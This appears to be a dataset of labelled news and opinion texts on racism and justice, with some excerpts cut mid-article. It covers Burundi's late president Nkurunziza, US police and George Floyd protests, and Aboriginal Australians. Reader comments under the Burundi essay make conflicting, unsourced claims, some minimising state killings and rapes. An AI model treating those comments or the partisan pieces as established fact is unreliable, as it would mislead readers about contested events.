Commission documents revealed that John Bareswill owns the UPS Store in the 4800 block of Princess Anne Road in Virginia Beach. In 2015, he was recognized by UPS as a “prime example of a veteran franchisee” in an article titled “Hometown Heroes: The UPS Store Celebrates Veterans Day by Honoring Veteran Franchise Owners.” UPS Corporate Communications would not confirm the portion of the article that praises Bareswill or that the article has been pulled from the company’s public relations platforms. However, a UPS spokesperson issued a brief statement on Saturday confirming the company’s ties with Bareswill and plans to sever those ties. “The UPS Store has zero-tolerance for racism, hatred, and bigotry. We are taking swift action to terminate his franchise agreement and he will no longer be associated with The UPS Store,” said Jenny Robinson in a statement issued exclusively to WAVY. New Hope Baptist Church spokesman Dr. James Allen said he does not know of any connection between Bareswill and the church — which is pastored by E. Ray Cox, Sr. A few days before the threat was issued, Cox joined other members of the Virginia Beach Interdenominational Ministers Conference in a call for a month-long economic boycott of businesses along the Virginia Beach Oceanfront and Town Center. Allen thanked the FBI and local agencies in their expedient efforts to arrest the suspect. If convicted, Bareswill faces a maximum penalty of 10 years in prison, according to officials.

1,"In 2015, thousands in Burundi took to the streets to protest against President Nkurunziza running for a third term. Credit: Igor Rugwiza. On 25 April 2020, exactly five years after Pierre Nkurunziza announced he would run for a third term, I attended the virtual screening of a new documentary. The Forgotten of the Great Lakes, directed and produced by Burundian filmmaker Joseph Bitamba, looks at the use of rape as a weapon of war, following survivors in the Democratic Republic of Congo, Rwanda and then Burundi. The Burundian survivors interviewed share one thing in common: they all lived in neighborhoods that actively protested against Nkurunziza’s third term in 2015 and were raped by security forces in retaliation. One woman’s testimony will haunt me forever. She does not wipe away her tears and her voice breaks as she describes how policemen and members of ruling party’s youth militia – the notorious Imbonerakure – burst into her home. They gangraped her, in front of her children, before trying to force her teenage son to rape her too. When he resisted, he was shot on the spot. He was left for dead, lying on top of his mother’s body, but survived his wounds. From that moment on, however, he was unable to look his mother in the eye. Having witnessed her violation and been forced to participate in it, something deeper than his physical wounds had been broken in him. He left home without saying a word a few days later, never to be seen again. When the news broke on 9 June that Nkurunziza had died, aged 55, my initial reaction was shock. It felt unreal, almost staged, a plot twist that befits literature, not real life. But slowly the shock began to fade as notifications exploded on my phone. Numbness cooled my veins and left me frozen, in a state I still can’t quite describe. I imagine what I am feeling is only a fraction of what these rape survivors felt upon hearing of his passing. Tradition in Burundi is deeply respectful of the dead. One does not speak ill of the deceased, certainly not in the early days. A seven-day national mourning period has begun across the country. My family and I prayed for the wife and children Nkurunziza leaves behind tonight. But I shed no tears over his untimely death. My tears, instead, are for the lives forever bruised and haunted by the pain his regime caused. I cry for the country we could have had these past five years; for the blood that could have been spared; for the memories families could have built together; for the amputated limbs of our young protestors; for the elderly who walked kilometres to end their lives in refugee camps; for the million little broken pieces so many of us have become. When Nkurunziza came to power in 2005, the air was full of possibility. A newly-elected president from the long oppressed Hutu majority was democratically acceding power, ending a decade of war. He promised change and social justice measures such as free primary education and maternity care. As a journalist at the time, pregnant with my first child, I covered the elections with enthusiasm at a new pan-African radio station. Independent media was flourishing, civic space was guaranteed, and there was an exceptionally open environment for political debate. Despite decades of politically induced ethnic tensions, Tutsis and Hutus alike seemed to believe in a new beginning for the nation. Things deteriorated slowly over Nkurunziza’s first term. Corruption and extrajudicial killings accelerated in his second. Then, in 2015, he announced he would run for a third, despite the constitution’s two-term limit. This prompted days of widespread protests. On 13 May, some soldiers carried out a failed coup. Soon after, the regime cracked down heavily on protesters, journalists, government opponents and activists. Many were imprisoned. The rest, including my own family, went into exile. Renaissance FM, the radio station I had helped start, was burnt to the ground. For many Burundians, waking up to photos of hand-tied, dead bodies stuffed in street gutters became the new norm. Human life lost value and family WhatsApp groups discussed murder and disappearances in the same breath as weddings and births. For exiled families like my daughters and I, the past five years have meant being torn from our lives and the innocence of childhood being forever halted in its course. I dedicated all my energy to bringing the regime’s crimes to light. I hoped, above all, that African states would break ranks from one of the worst dictatorships today. To put things in perspective, the notorious Chilean dictator Augusto Pinochet is estimated to have killed 3,200 people over 16 years. By 2018, it was estimated that Nkurunziza’s regime had killed 1,700 people in just 4 years. State violence is not new to Burundi. Nkurunziza followed in the footsteps of his predecessors, including those who murdered his own father in 1972 and those he fought to overthrow with his rebellion. He was the product of a cycle of impunity, which is at the root of Burundi’s recurring crises. It pains me that his sudden death robs us of another chance to install a culture of justice and accountability so essential for lasting peace. Perhaps the greatest irony in Nkurunziza’s death is his dismissal of the COVID-19 pandemic. In recent rallies in support of his successor Evariste Ndayishimiye, who won presidential elections just three weeks ago, he claimed that God had purified Burundi’s air and that no masks were necessary in his blessed land. One of the last acts of his government was to expel World Health Organisation representatives and dismiss the need for preventative measures. Although the official cause of Nkurunziza’s death is a heart attack, rumours abound that he had contracted the virus. His wife, Denise Bucumi, was airlifted to Kenya for treatment days earlier, a luxury most Burundians cannot afford to dream of. He leaves his country at high risk, with some of the poorest health infrastructure on the continent. Those who were close to Nkurunziza or directly benefited from his rule grieve him today. It is their right. But his death should not sanitise his life. I am holding space for a different loss, for the deaths which are not reported and for which flags will not fly at half mast. I mourn the tortured, the imprisoned, the impoverished. Nkurunziza may find peace in death, but his victims will live with the wounds of his rule for the rest of their lives. My heart goes out to them. May a new dawn rise for them and for the Burundian people as a whole. This is the hard work that awaits us all.  Ketty Nivyabandi is a poet and activist from Burundi. In 2015, she successfully mobilised women to peacefully protest President Nkurunziza's bid for a third term in office. She later left her country after numerous threats on her life and currently resides in Canada. This is just so traumatic. That people can decide to be so inhuman as to lose a sense of humanity is something that still baffles me. Like what would one gain by such a senseless system of torture on the helpless citizens. But I find a lot of similarities in Nkurunziza’s evil acts with those of Jean Francois Duvallier of Haiti. Both made themselves the supreme beings, used the militia groups to crudely silence voices of dissent. With the unfortunate effect that women lived to suffer the most, as men never remained alive at all. This is an incredibly powerful and beautifully written piece. From God we all come and to Him we shall return. Ketty you represent many people all over the World. For Burundi and Africa your story and view point is priceless. Burundi has had its fair share of trauma coming from all sorts including bad politics. We now know that Burundi is bigger than one man. Let peace and development prevail in Burundi. “Be the change you wish to see in the world “- I don’t see anywhere where white people constantly say “black people, black people, black people but we black people create these platforms where we think we can constantly condemn another race, call them racist and still don’t see that we are being racist ourselves! We all need to change attitudes! Being Kenyan and having been of age during the Rwandan Genocide, I have always wondered where Burundi went. It is important to have a governmental system that holds people to accountability. Never tire of doing the right by your country men. Lord knows, we need people like you here in Kenya. God be with you. President Pierre Nkurunziza, now departed, might as well be one of the most misunderstood figures of our time. The “misunderstanding” is a deliberate outcome of a deliberate effort to discredit him, as well as his inability (or unwillingness) to respond to the pervasive and highly oiled propaganda machine enabled by his fascist predecessors and neighboring Rwanda. Ms. Ketty’s passionate writing can be viewed in this context–that of denying the “silent majority” that forms this country’s voice. Such a predisposition and determination to bend progress (for Hutu and Batwa) is undoubtedly empowered by historical privilege. For a comparison, think of white South Africans who cry that the ANC is pursuing a policy of genocide against them. That anti-Nkurunziza propagandists gain widespread audience and credence without placing their complaints into a historical context is the tragedy of our time. Mistakes were made during Mr. Nkurunzia’s rule, but no government can completely avoid missteps. Most observers, including Mr. Nkurunzia’s strongest critics, agree that his first two terms were quite successful and monumental. Senator Krueger, a former US ambassador to Burundi, has described him as a “Nelson Mandela of our time.” Such a description is not just lazy pontification. Mr. Nkurunziza inherited a state that was widely dilapidated and destroyed by years of Tutsi-led apartheid and ethnic cleansing. Even the strongest critics agree that he was largely able to unite Hutu and Tutsi people, which would have been previously unthinkable. His efforts towards educational equality are almost unparalleled in recent times. Consider this: when Mr. Nkurunziza left to join the rebellion in the 1990s, a majority of his Hutu classmates were exterminated at the National University of Burundi. In fact, the Tutsi government of Micombero killed Nkurunziza’s Hutu father. How does one address deep-seated historical injustices when a group that was previously no more than vassals find themselves in charge of the state? Most examples we have in history are hardly neat. Burundi’s neighboring Rwanda at one point had close to one million people in jail. Mr. Nkurunziza insisted Burundi couldn’t look back. He was acutely aware that pursuing historical injustices would jeopardize his power balance. This might perhaps be his greatest mistake. How else would one explain that Mr. Pierre Buyoya, the Tutsi butcher of tens of thousands of Burundians, is now an African Union envoy in Mali, and lecturing present-day Burundi on democracy? Of course, Mr. Buyoya and his accomplices, who never faced any scrutiny for their past crimes against humanity, were always going to undermine Mr. Nkurunziza’s rule. Lastly, some specific reference to Ketty’s allegations. I imagine that most of them, if not all, are actually accurate. But there goes the dangers of a single story. In 2015, over 200 Burundian policemen were killed. I tried to imagine what would happen if a handful of police officers are murdered by “protestors” in the US during the ongoing strife. Very few can disagree that the response would likely be very heavy handed. States have a hard time responding to peaceful protestors. When provoked by violent uprisings, states respond in heavy-handed ways. 2015 undoubtedly changed Mr. Nkurunziza, it also changed Burundi. Now that Mr. Nkurunziza has exited the stage, newer possibilities are on the horizon. Ketty thanks for audest of writing such a wonderful piece am sure may people have and will read about it and maybe get a lesson from it..there are so many people out there who are victims of such ruthless leaders I pray that this comfarts and gives them psychological peace of mind. All leader should learns that’s karma is abitch people may not get to u directly but some how u will pay for you’re deeds dying at 55 is punishing enough what is not worse like you’re children reading such a piece of work when you’re Dead This article is deliberately historically myopic and a bitter self-centered tantrum by a privileged ar-chair activist. Actions have reasons and causes. And they all lie in Burundi’s painful history 1962-2004 when a million bodies littered this country before Nkurunziza became president. Through his goodwill a peace deal was signed in 2003 and the country began to recover from its nightmare. 2015’s mini crisis with 400 victims on both sides had its reasons and Nkurunziza was not the cause, just the scapegoat. 400 dead is just one day of massacres that Nkurunziza and his people were victims of in 1972 and 1993-2003. Nkurunziza, national hero and architect of Burundi’s peace who unlike the regions’ other leaders sacrificed himself and his reputation for his country and was leaving office willingly despite having the right to continue. The “guys” who caused the 2015 insurrectional movement are the ones to be accountable not the President. We all know political reasons behind that violent movement supported and funded by “western powers” who didn’t want him and his regime to continue. He barred their corridor to “Katanga” in DRC for their minerals robbery from DRC. He also established strong relationships with China and Russia. He supported different emancipation movements around Africa continent. He was acclaimed as an examplary panafricanist by many Africans. All of these elements didn’t please the West. Of course they are people who died when he was in power, but he shouldn’t be held accountable for every single death, including ones caused by outside factors. The passing President had done a lot on reconciliation side and education. We all know long uncertain periods Burundi was rising from. If you doubt, go to countryside and ask how many didn’t finish their high school studies, didn’t attend universities, or didn’t pursue fields they wanted because they feared of being executed simply because of they were created. Ask how many people didn’t know if they ever succeeded or not the national exam done at the end of primary school (Concours National). Burundians needed to heal first their long wounds. Development is not an overnight even, and we couldn’t just jump into an economic boom. May the late President, the Unifier, the freedom fighter and brave Rest In Peace. Indeed, “The tomb of a hero reposes in the hearts of alive ones.” My prayers go to the immediate family of H.E. Nkurunziza, the government of Burundi, his origin political party and all Burundians. Hello Horja,Ofcourse charity begins at home and that is a fact. Interesting that I do not see where in Ketty’s article she referred to any race, black or white. Ketty appeared to be reflcting on her own suffering and fellow Burundian’s trauma perpetrated by Nkurunziza whilst he was in power.That wasn’t hard was it? Who killed Ndadaye and were they ever convicted or handed to the ICC? As a southern African and student of recent African History I know the injustices that have befallen the Burundians and completely ignored by the world. Unfortunately most people are ignorant of the real butchers in Burundi. Jacob Ndashimiye,You have written a novel!!Not sure if it it was all worth the space.You seem to be condoning evil acts and Nkurunziza sympathizer.Very absurd. Eliseus,You sound terrible!I would not mistake you for an imbonerakure.The reason being given your view point.What would stop you murdering your own people or joining in on a ganga rape of the defenseless. The evil that men do follows them. It is a global culture not to celebrate death and our sympathy to the family of the deceased President. What happened should serve as a cautionary measure that God lives and that there is an indirect price for evil doers. Governance is not about heaping mayhem on the people but about leaving a land mark in the hearts of the people that you meant to serve. A public servant should be humane and demonic. It seems the late Nkurunziza’s propaganda machine is bent on misleading the opinion. 15 years of misrule left the country in economic and social shambles. He died while he was under investigation by the International Criminal Court for crimes against humanity. Sadly his victims will never have justice unless the ICC can impound the immense wealth stashed in tax Havens to pay reparations to Nkurunziza’s victims. As the Panama Papers disclosed, Nkurunziza had amassed a fortune amounting to US$ 160 Million. At the demise of Nkurunziza, Burundi is left the poorest and the unhappiest country in the world. The cost in terms of youth lives needlessly destroyed is staggering. Contrary to the propaganda smoke screen we are reading here, he was opposed mainly by his own party leadership including the Vice-President IGervais Rufyikiri and Speaker of Parliament Pie Ntavyohanyuma and countless government officials. His own intelligence CEO, General Godefroid Niyombare, wrote to him a searing letter imploring him not to stand for an illegal third term. It’s only after loosing the support of his own rank and file that he started fanning ethnic hatred. Yet during his term he had ruthless killed his fellow tribesmen who adhered to opposition leader Agathon Rwasa. He resumed killing them in the run-up to the May 2020 elections that Rwasa is believed to have won. Burundi masses were yearning for change under the leadership of another Hutu president, Agathon Rwasa, to take them out the untold misery they live in. Their dreams were dashed by a stolen election from them. They are in for another 15 years of economic collapse since the same system remains in power. For those who don’t know the author Ketty Nivyabandi, let me enlighten them. Ms. Ketty Nivyabandi is a poet, top-notch intellectual (she amazingly masters English and French in equal measures), community leader cum revolutionary. On 13 May 2015, she managed to galvanise Burundi women from all walks of life: professionals, traders, employees, students, slum dwellers, millennials, who took entire control of Bujumbura city centre where men had failed at a great human cost. The courage of women rallied men from all of Bujumbura districts and the butcher of Bujumbura (as Kenyan cartoonist, Gado, eloquently summed it up) Nkurunziza was non-violently toppled only to be saved by a last-minute and unfortunate military coup attempt in the afternoon of that fateful day. Women, and African women for that matter, are a special breed. I had tears in my eyes when Rev. Alan Sharpton, at the Minneapolis Memorial for martyred George Floyd, paid tribute to the exceptional African-American mamas who single-handedly raise black families and build the nation just like in Africa. Ruthless Dictator Sekou Toure said when women took to the street against him: “If women are against us, we are finished.” Thanks to the tremendous courage of Burundi women, the Butcher of Bujumbura was finished only to be saved by an unfortunate military coup attempt. From there, Nkurunziza went on to kill the youth leaders one by one, dumping their bodies in the street, and when he finished them off, he moved on to civil society and human rights activists, one by one. When he missed by a whisker the famed Human Rights Leader Pierre-Claver Mbonimpa who miraculously survived a bullet in the neck, he killed his son-in-law and next Pierre Mbonimpa’s teenager son in retaliation for his survival and evacuation to Europe. Cruelty at diabolical level. Yet, during the civil war, nobody touched Nkurunziza’s family though he was commander of a guerrilla army that targeted mainly innocent Tutsi villagers without sparing even schools. His wife and children lived peacefully in Bujumbura. He didn’t have the moral high ground to spare the lives of family folks of non-violent opponents who opposed him peacefully. Nkurunziza lived a life of lies to his very end. He lied he was a born-again christian yet he killed, maimed, tortured, raped, jailed and exiled thousands of innocent youths for the only crime of expressing peacefully their constitutional opinion. He lied that he was chosen by God while he was a monster from hell. He lied that God had spared and shielded Burundi from Covid-19 while he died of coronavirus. In all this tragedy, the EAC failed Burundi. The EAC was the guarantor of the Arusha Accords for Peace and Reconciliation, yet it indifferently let Nkurunziza butcher his own people. Martin Luther King Jr. said: “In the End, we will remember not the words of our enemies, but the silence of our friends. “ Prince, What do you mean by a public servant should be himane and demonic? IDI, I am a Burundian, not imbonerakure! I am a Burundian who understands the history, where we came from and where we want to reach. There is no paradisiac State on Earth, let’s be realistic. Burundi is peaceful, know people who live in it. I am fed up with this propagandistic media that keeps insulting the image of Burundi and Africa in general.

1,"Despite the Twitter pleadings of Rep. Ilhan Omar (D-MN), who called for the Minneapolis police to “disband” and then “reimagine” in the name of social justice, the majority of African Americans has never wanted and does not want the police to leave their community. The Minneapolis Police Department has proven themselves beyond reform. It’s time to disband them and reimagine public safety in Minneapolis. Thank you to @MplsWard3 for your leadership on this! https://t.co/AQfHM5M6eR — Ilhan Omar (@IlhanMN) June 5, 2020  This sentiment, despite being unpopular, is being shouted by Black Lives Matter protesters, who loudly booed the Minneapolis mayor when he refused to endorse defunding the police. According to the Gallup poll, released on August 6, 2015, even though the African American community was split on whether police treat them fairly, a total of 92 per cent of poll respondents indicated they are either comfortable with the current number of police or would prefer additional police. 33 per cent of African Americans want a higher police presence in their community, and interestingly, of those African Americans who specifically believe that they are treated unfairly by police, 44 per cent want a larger police presence in their community. 59 per cent of African Americans want the current number of police to be maintained, leaving only 8 per cent calling for less police. This is also true for white and Hispanic Americans. Among whites, 94 per cent want the same or more police, and among Hispanics, 95 per cent want the same or more police. These results appear not to have changed wildly in the intervening five years, as a now famous YouGov poll reveals that despite the constant haranguing of Black Lives Matter protesters across the country, only 16 per cent of Americans want the police to be defunded: Despite calls by activists and protesters to defund police departments, most Americans do not support reducing law enforcement budgets. Close to two-thirds (65%) oppose cutting police force funding. Just 16 percent of Democrats and 15 percent of Republicans support that idea. While the number of those who want less or “defunded” police has grown from 7 per cent to 16 per cent in five years, it remains a minority view only held by a select few. As was indicated in 2015, there is, however, bipartisan support for expanding police education and resources when it comes to deescalating conflicts, identifying potential bad police officers, and increasing to use of body cameras to record the behavior of police and the public they interact with. © 2022 NationalFile.com National File, LLC.

1,"Dear friends and wilderness supporters: The nation needs us today. When Black people cannot move freely in the communities in which we all live, then our public spaces can never deliver on their promise of equitably benefiting all. Each of us deserves a right to clean air, clean water, and access to nature for the health of ourselves and our communities. We condemn all acts of violence, intimidation and police brutality against Black People and people of color. And we stand with all who are peacefully expressing their solidarity against the killings of George Floyd, Breonna Taylor and Ahmaud Arbery, and many others. By now you’ve probably seen the news about the Trump administration’s reprehensible use of the United States Park Police, other federal police forces and National Guard to clear a public park in Washington, DC, of peaceful demonstrators. Parks have been created for everyone to gather and find solace in the outdoors and with each other; they should never be places of hatred, terror or retribution. I also want to underscore that some of the high-profile injustices against Black people in recent weeks have occurred in the outdoors. Ahmaud Arbery was killed while going for a run outdoors. Christian Cooper was harassed and racially profiled while birding in Central Park. These stories further demonstrate how Black people must live in fear of racially motivated violence, harassment or intimidation. We stand in solidarity with the African American community against these tragic injustices, and we are committed to working with partners to ensure our shared public lands are safe and welcoming for Black Americans as well as for everyone. There are many wonderful groups working for racial justice, including the NAACP Legal Defense and Educational Fund. Whether you’re participating in peaceful protests or looking for other ways to speak up, we ask that you consider supporting these groups today. It’s up to all of us to build an equitable and inclusive society. Thank you,  Jamie Williams President, The Wilderness Society For joining the movement to save our lands. We were unable to process your request. Please try again."
1,"PADERBORN, GERMANY - MAY 31: Achraf Hakimi Mouh of Borussia Dortmund celebrates scoring his teams fourth goal of the game with a 'Justice for George Floyd' shirt during the Bundesliga match between SC Paderborn 07 and Borussia Dortmund at Benteler Arena on May 31, 2020 in Paderborn, Germany. Several international footballers are using their platforms to express support for the fight against racism in the US and beyond. The recent murder of George Floyd, another unarmed Black man, has sparked great outrage and protest within the streets of the US and cities across the world. With professional sports slowly making their way back onto our screens, many famous faces in football have shown solidarity to those fighting for the cause. Manchester United Midfielder Paul Pogba expressed his sadness on a recent Instagram post. The player wrote ""Sadness for George and for all Black people who suffer from racism every day! Whether in football, at work, at school, anywhere!"" This comes after Pogba himself has experienced explicit racism during his professional career. In 2019, he and Man United striker Marcus Rashford fell victim to harsh racial abuse over social media. Using the hashtag ""#NoToRacismWeAllOne"", the football star's plea brought power and support to the thousands protesting across the world.  See on Instagram Similarly, Moroccan defender Achra Hakimi showed his support during Borussia Dortmund's recent win against Paderborn, with a shirt that had the words ""Justice for George Floyd"" written across it:   While celebrating his first hat trick in his professional career, Borussia Dortmund midfielder Jadon Sancho also took the opportunity to show his support for the fight for freedom in a similar fashion:   During one of their team practices, Liverpool Football Club players, including Egypt's Mo Salah and Senegal's Sadio Mane, took a knee to show support and to emphasize strength in numbers and coming together. Mane, who has been outspoken about the racism faced by Black players, shared the image on Instagram, writing ""Unity is strength #BlackLivesMatter.""  See on Instagram South African women's football captain Janine Van Wyk echoed the words of Bernice King and asked, ""When will people of this world treat others equally regardless of race or gender? #BlackLives Matter #AllLivesMatterWhenBlackLivesMatter""   Nigerian player Anthony Ujah highlighted how common the murders of unarmed Black men seem to be when he simply edited ""George Floyd"" onto a t-shirt he wore in 2014 to protest the police killing of Eric Garner.   Although the officer in question, Derek Chauvin, was recently arrested and charged, the protests continue to fight for and defend the lives of Black and African American individuals across the world."

The respected Aboriginal Christian leader invited the congregation in the city centre to “come on a journey with Aboriginal people … we’re going to change this nation.” The service was one of 23 #ChangetheHeart services around the country to call on Christians to gather, pray, lament and hear the truth about past injustices and discrimination still faced by Aboriginal people. The service was led by Brooke Prentis, who is about to take up her role as CEO of Common Grace. Prentis opened the service by saying she wanted “friendship, not reconciliation, between Aboriginal and non-Aboriginal people.” Aunty Jean and Lea Maslen started these services seven years ago. They have been gathering prominence and momentum; along with meeting in Sydney Anglicanism’s prime property, Aunty Jean will speak tonight at a service in St Paul’s Anglican Cathedral in Melbourne. #ChangetheHeart service at St Andrew’s Anglican Cathedral Despite this progress in awareness of the #ChangetheHeart movement, Aunty Jean said that in Brisbane, her hometown, and all around the country, life is not easy for Aboriginal people. They face homelessness, poverty and prison. “And we in Christian ministry are caught up with all of those things and it’s not easy,” she said. “Most Aboriginal ministry in this country has never been supported by the church and that’s just so sad. “The churches in this country really have inherited so much from what has happened to our people – and we don’t begrudge them for that, but we don’t have those kinds of luxuries. Most Aboriginal ministries have never been supported.” She then spoke of some of the 12 Aboriginal pastors who have passed away over the past 12 months, including Stan Grant’s Aunty, Flo Grant, who had fought the churches for justice for many years. “I want to ask every church in Australia to adopt someone in Aboriginal ministry …” – Aunty Jean Phillips She quoted Aboriginal Lutheran Pastor George Rosendale, who passed away a few months ago, as saying “there will never be reconciliation and revival in this country until we acknowledge the theft of this land and what has happened to Aboriginal people.” “We don’t want your churches or your buildings back, but you need to acknowledge it and to help us to face those challenges and those needs that are before us,” she said. Aunty Jean then put out a challenge: “I want to ask every church in Australia to adopt someone in Aboriginal ministry for prayer, for friendship and to pay their resources.” She mentioned that South Brisbane Anglican Church had raised money to pay the registration for the vehicles of “our people” going into Aboriginal ministries. “Well, that’s good but Australia has the responsibility of supporting the First Nations people in their ministries. You wouldn’t know the poverty until you come and live with us in the Aboriginal community,” she said. Aunty Jean also called on churches to reach out and help young Aboriginal people including those in prison. “The sin of this nation – a lot of our kids are locked up in prison because of stealing and, yet, the theft of this land has never been dealt with,” she said. “I’ll be writing to all the heads of churches – and asking what they’re doing about chaplaincy and doing things with these young people. All the wealth that they’ve got – remember, the wealth that has come because of what has happened to Aboriginal people. Aunty Jean called on church leaders to invite an Aboriginal minister to come and preach at their meetings. “That’s why we’re calling on you tonight to come and join us and pray. “Get to know us. I’m not going to growl at you. I do growl sometimes. But we’re all coming to join together. The Prime Minister or the government is not going to change Australia, but you and I are going to change us – when you pledge tonight to pray that we might be able to change this nation through true reconciliation.” Aunty Jean called on church leaders to invite an Aboriginal minister to come and preach at their meetings. She recommended Aboriginal pastor Ray Minniecon – who was at last night’s service – as a “great biblical teacher”. “Ray, will you come up here, son. Come on, come on up,” Aunty Jean beckoned to Uncle Ray. While standing with Aunty Jean, he suggested that the congregation give Aboriginal pastors a surprise and visit them on Sunday, January 26. “If you want to join us at Aboriginal church services, then surprise Michael Duckett out at St Peter’s in Campbelltown, or you can go out to Tregear to Richard Manton – give him a big surprise,” encouraged Uncle Ray. “You have an Aboriginal ministry also in Redfern, Elizabeth Street with Matthew Paterson, or you can come to St John’s in Glebe and join us there. So, please, you’re always welcome; come and meet us and enjoy our fellowship in Christ.” Aunty Jean urged the congregation not to criticise Aboriginal people for marching on Sunday “because they’re hurting and that’s the only opportunity that they have of telling their stories”. She said that presented an “opportunity of reaching out to those people and telling them of God’s love”. “So, don’t criticise them; pray for them and get your minister to pray for us all together on Sunday – praying for the relationships between Aboriginal people and non-Aboriginal people.” Related stories from around the web Common Grace Eternity News is not responsible for the content on other websites Sunday, June 5, is World Environment Day: the United Nations’ day to highlight care for… Sunday, June 5, is World Environment Day: the United Nations’ day to highlight care for… In Canada, in the freezing cold, there was a long, long line of people waiting… In Canada, in the freezing cold, there was a long, long line of people waiting… With only 15% of Australians attending church on a Sunday, Christians need to be seen in our world.

1,"A decision to ban the Aboriginal flag and other forms of recognition from Anzac Day services in Western Australia (WA) has sparked widespread backlash. Each year, solemn ceremonies are held on 25 April in Australia and New Zealand to commemorate veterans and soldiers. But a veterans' organisation said it would no longer allow Aboriginal displays at its services in the state. It added that all content, except the NZ anthem, must be in English. The Returned Service League (RSL) has previously been criticised for ignoring and diminishing the service of Aboriginal soldiers in World War One and other conflicts. The decision follows a move last year where the Ode of Remembrance was read at a ceremony in an Aboriginal language, the Australian Broadcasting Corporation reported. Critics, among them indigenous and non-indigenous lawmakers, have called the move ""offensive"" and demanded it be reversed. Another day in WA as @RSLWA bans the Aboriginal and Torres Strait Islander flags at ANZAC and Remembrance Day services. You refused to acknowledge when mob served, and now you continue to refuse to acknowledge us. The new policy for the state's RSL also prohibits Welcome to Country and Acknowledgement of Country ceremonies - which have become commonplace around Australia. The brief protocols acknowledge indigenous connection to the land, and are commonly read out or performed at the commencement of a formal gathering or event. However, the RSLWA said such gestures at Anzac Day or Remembrance Day ceremonies would be inappropriate. ""While having utmost respect for the traditional owners of land upon which such sites and memorials are located, RSLWA does not view it appropriate that a Welcome to Country is used at sites that were specifically established to pay homage to those who died and who came from a wide range of cultural backgrounds,"" their policy reads. Anzac Day has become a flashpoint for controversy in Australia in recent years, and sparked debates on national identity. Critics say the ""Anzac"" legend, which focuses on Australia and New Zealand's campaign at Gallipoli in World War One, prioritises a white-Anglo narrative and glorifies a battle where many Allied soldiers died. According to the Australian War Memorial, at least 1,000 indigenous Australians are recorded to have fought for their nation in WW1, and ""the real number is probably higher"". ""It is not known what motivated Indigenous Australians to join the Australian Imperial Force (AIF), but loyalty and patriotism doubtless played a part,"" says the memorial's website.

The Australian Rugby League (ARL) Commission made the decision after advice from the ARL Indigenous Council. An Indigenous team will face a Maori team in the annual pre-season match at Cbus Super Stadium on 22 February. ARLC chairman Peter V'landys said:external-link ""We have listened to our players' concerns that the words of the anthem do not represent them or their families."" This year's event in Robina marks the 10-year anniversary of the first All Stars game, devised by former player Preston Campbell to celebrate Aboriginal and Torres Strait Islander culture. The National Rugby League also stages an annual Indigenous Round during the season and now 12% of NRL players identify as indigenous. Before game one of last year's State of Origin series, several indigenous players refused to sing the national anthem. 'Advance Australia Fair' was written in 1878 and ""does not include an acknowledgement of First Nations people"", V'landys added. ""The All Stars game was created as a celebration of Indigenous players and their culture. We respect their wishes and have agreed that the anthem will not be played."" St George Illawarra Dragons prop Josh Kerr sang the anthem before making his representative debut in last year's All Stars match but his views have since changed.

1,"Solidarity with US protesters following George Floyd’s death is important, but Australia also needs to address its own racism In April, after a long battle, the family of Tanya Day achieved a victory. The inquest into the death of their mother following a fall while in Castlemaine police station found that unconscious race bias had played at least some part in her arrest. While the coroner fell short of labelling the neglectful actions of the attending police as such (though they were found to have violated Day’s human rights), she did find that the train conductor had made judgement calls based on Day’s Aboriginality which contributed to him calling the police on her in her intoxicated state. In other words, had Tanya – who had a valid ticket – been left to merely sleep on the train like so many other intoxicated commuters who aren’t Aboriginal are, she might still be with us today. This finding followed an earlier victory Ms Day’s incredible children had achieved: that “public drunkenness” would be removed from the criminal code in Victoria. In 2019, the Victorian premier promised this would happen – a mere 28 years after this recommendation was handed down by the royal commission into Aboriginal deaths in custody because it was found that such laws disproportionately criminalised Aboriginal people. It’s thanks to the family of Tanya Day that all Victorians now have the right to make it safely home, without police interference, no matter what our state. I mention this case because it’s one that everyone who lives in Victoria, and Australia, should know. Day’s family joined the countless other heartbroken Aboriginal families in this country who have had to embark on a journey for justice for their loved ones who have died in police custody. Over 430 of them, incidentally, since the royal commission findings were handed down. Yet despite the fact that this keeps happening, Australia mainly turns a blind eye to the problem, or bends over backwards to justify the fact that Aboriginal people are the most incarcerated race of people on the planet. It’s therefore been interesting, and disheartening, watching the Australian response to the riots happening in the US following the death of African American man George Floyd while in police custody. The world should be outraged by his death and should be taking action to ensure it never happens again. Yet the 24-7 coverage here shows just how much more newsworthy a Black death in custody from the US is here than the many Aboriginal deaths in Australia. I’ve had people on Twitter tell me that perhaps if there were riots here, there would be more interest. The thing is, there are riots here. Recently, Palm Island residents were awarded compensation after the federal court found police used excessive force on residents during riots following the 2004 death in custody of Mulrindji Doomadgee. Despite the fact that only Aboriginal people were imprisoned for what transpired on Palm Island, the best Nine News could muster in response to this compensation payout was a news report essentially accusing residents of fraud and reckless spending of “taxpayer monies”. Redfern rioted after 17-year-old TJ Hickey was killed riding a bike while police pursued him. His body was impaled on a fence. Yet I guarantee you that hardly any Australians remember these riots, let alone his name and the fact that his family are still calling for justice. Or what about Joyce Clarke, who was shot by police in Geraldton last year as she was apparently experiencing a mental health episode? The police officer who shot her entered a not guilty plea to his murder charge only days ago. Authorities at the time were so concerned there would be a riot following Clarke’s death that their racist solution was to ban alcohol sales to certain locals. How many in Australia would have taken to the streets for Joyce? Further salt is rubbed in the wound when we see Black Lives Matter solidarity rallies in Australia being organised without consultation with the people whose lives are impacted the most by police brutality on this soil – Aboriginal people. It’s fantastic that people know police actions can’t go on unchecked, and showing solidarity is key to racist institutions being challenged wherever they are in the world, but why is solidarity often lacking when it comes to Australia’s own atrocities? Why did a Black Lives Matter US solidarity rally in Melbourne in 2016 attract thousands, yet a rally to shut down Don Dale juvenile detention centre following police brutality enacted on Aboriginal children only two weeks later failed to generate anywhere near that level of public interest, even if that smaller crowd succeeded in closing down the Melbourne CBD until 2am? Truth is, a large part of it comes down to Australia’s inability to acknowledge and properly address its own racism. Wave after wave of immigrants can come here and experience Australia’s unique brand of racism yet still manage to be more accepted and higher up the social rungs than Aboriginal people will ever be. It’s too hard to deal with local issues, and therefore pointing at America and saying “but they’re worse” is an easy method of avoidance. Global solidarity for the lives of black people and the fight against institutional racism is so incredibly important. It’s in this solidarity and exchange that we find the strength to continue challenging in the hope that this never happens again. I only wish that while Australia is looking abroad for reasons why it should care, it would spend a bit of time ensuring that things change on this soil as well.

